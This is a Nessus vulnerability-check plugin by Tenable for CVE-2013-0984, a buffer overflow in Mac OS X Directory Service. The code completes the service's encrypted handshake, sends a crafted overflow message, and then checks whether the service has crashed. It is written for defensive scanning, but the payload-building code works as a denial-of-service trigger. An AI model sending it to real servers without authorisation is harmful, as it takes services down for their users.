#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69319);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/20 14:12:04 $");

  script_cve_id("CVE-2013-0984");
  script_bugtraq_id(60328);
  script_osvdb_id(93923);
  script_xref(name:"APPLE-SA", value:"APPLE-SA-2013-06-04-1");
  script_xref(name:"EDB-ID", value:"25974");

  script_name(english:"Mac OS X Directory Service Buffer Overflow");
  script_summary(english:"Detect Directory Service vulnerability");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is susceptible to a buffer overflow.");
  script_set_attribute(attribute:"description", value:
"The remote host is susceptible to a buffer overflow vulnerability.
At a minimum, this could result in a denial of service to the Apple
Directory Service.");

  script_set_attribute(attribute:"see_also", value:"http://support.apple.com/kb/HT5784");
  script_set_attribute(attribute:"see_also", value:"http://lists.apple.com/archives/security-announce/2013/Jun/msg00000.html");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/526808/30/0/threaded");

  script_set_attribute(attribute:"solution", value:
"Upgrade to Mac OS X 10.6.8 and Directory Service 6.5 build 621.16 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/06/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/06/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/13");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:apple:mac_os_x");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");
  script_require_ports(625);
  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

app = "Apple Directory Service";
set_byte_order(BYTE_ORDER_BIG_ENDIAN);

# Encrypt Data
function encrypt_data(key, message)
{
  local_var iv;

  iv = mkpad(16);

  return  aes_cbc_encrypt(data:message, key:key, iv:iv);
}

# Decrypt Data
function decrypt_data(key, message)
{
  local_var iv;

  iv = mkpad(16);

  return  aes_cbc_decrypt(data:message, key:key, iv:iv);
}

# Send Data
function send_data(socket, message)
{
  local_var data;

  data = "DSPX" +  mkdword(strlen(message)) + message;

  return send(socket:socket, data:data);
}

# Receive Data
function recv_data(socket)
{
  local_var recvdata, message, size;

  recvdata = recv(socket:socket, length:65535 );
  # Valid returned data is greater then 10 bytes and has a prefix of DSPX.
  # Remove prefix (first 8 bytes) and postfix (last byte) from returned data.
  size = getdword( blob:recvdata, pos:4);

  if (strlen(recvdata) > 10 && recvdata =~ "^DSPX") message = substr(recvdata, 8, (size+7) );
  else message = NULL;

  return message;
}

# Reverse buffer
function reverse(buffer)
{
  local_var reversed, i;

  reversed = "";
  for (i = (strlen(buffer) - 1); i > -1; i--) reversed += buffer[i];

  return reversed;
}

#
#  Create TCP/IP Session
#
# Apple has assigned the service to be on port 625
#  present configuration does not allow the assignment to be changed.

port = 625;

if (thorough_tests && ! get_kb_item("global_settings/disable_service_discovery") )
{
  port_known = get_unknown_svc(port);
  if (!port_known) audit(AUDIT_SVC_KNOWN);
}
if (known_service(port:port)) audit(AUDIT_SVC_KNOWN);
if (!get_tcp_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

if (!get_port_state(port)) audit(AUDIT_NOT_LISTEN, app, port);

# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, app);

#
# Send Public Key
#
dh_pub = mkpad(63) + mkbyte(2);
pub_key = "DHN2" + dh_pub;

send_data(socket:soc, message:pub_key);

#
#  Process Key value from Directory Service
#
server_buffer = recv_data(socket:soc);

if (server_buffer == NULL) audit(AUDIT_NOT_INST, app);

# Flip the buffer 180 degrees
server_key = reverse(buffer:server_buffer);

#
# Calculate Session Key
#
prime = bn_exp(bn_dec2raw(2), bn_dec2raw(128));
shared_key =  bn_mod_exp(server_key, bn_dec2raw(1), prime);

#  Flip the Key again
derived_key = reverse(buffer:shared_key);

#
# Secure Hand Shake
#
check_data = "AAAA";
check_data += crap(data:raw_string(0x0c),length:12);

enc_check_data = encrypt_data(key:derived_key, message:check_data);

if (isnull(enc_check_data)) audit(AUDIT_AUDIT_NULL_ARG, app);

send_data(socket:soc, message:enc_check_data[0]);

#
# Check Secure Connection Established
#
check = recv_data(socket:soc);

if (isnull(check)) audit(AUDIT_NOT_INST, app);

dec_check_data = decrypt_data(key:derived_key, message:check);

if (isnull(dec_check_data)) audit(AUDIT_AUDIT_NULL_ARG, app);

compare_data = "AAAB";
compare_data += crap(data:raw_string(0x0c), length:12);

# returned check data is incorrect then not Apple Directory Service and exit
if (dec_check_data[0] !~ compare_data) audit(AUDIT_NOT_INST, app);

#
# Send Vulnerability Check
#
vuln_data = "";
item = "dsAttributesAll";
vuln_data += mkdword(strlen(item)) + item;
vuln_data += mkpad((0x1b - strlen(vuln_data)));
vuln_data += mkbyte(0x02);
vuln_data += mkpad(4);
vuln_data += mkword(0x101) + mkpad(2);
vuln_data += mkpad((0x34 - strlen(vuln_data)));
vuln_data += mkdword(0x1173);
vuln_data += mkpad((0xe0 - strlen(vuln_data)));
vuln_data += mkpad(16);

enc_vuln_data = encrypt_data(key:derived_key, message:vuln_data);

if (isnull(enc_vuln_data)) audit(AUDIT_AUDIT_NULL_ARG, app);

send_data(socket:soc, message:enc_vuln_data[0]);

#
# Get a response?
#
recv_resp = recv_data(socket:soc);

if (isnull(recv_resp)) audit(AUDIT_INST_VER_NOT_VULN, app);

dec_recv_data = decrypt_data(key:derived_key, message:recv_resp);

if (isnull(dec_recv_data)) audit(AUDIT_INST_VER_NOT_VULN, app);

end_delim = substr(dec_recv_data[0], (strlen(dec_recv_data[0]) - 15));
end_delim_chk = crap(data:raw_string(0x0f), length:15);

close(soc);

# End Delimiter not matching then not Apple Directory Service Vulnerability
if (end_delim !~ end_delim_chk) audit(AUDIT_INST_VER_NOT_VULN, app);

# Verify Connection still available
# Let 5 seconds to verify the exploit code was not executed
sleep(5);
service_down = NULL;
soc2 = open_sock_tcp(port);

# Check if connection was established.
if (!soc2) service_down = '\nApple Directory Service is now down.\n';

close(soc2);

#
#  Report vulnerable Apple Directory Service
#
report = NULL;

if (report_verbosity > 0)
{
  report = '\n';
  report += 'Vulnerable version of Apple Directory Service\n';
  report += 'Directory Service found is less than version 6.5 (build 621.16)\n';
  report += 'Fixed in Mac OS X version : 10.6.8 update 2\n';

  report += service_down;
}

security_hole(port:port, extra:report);
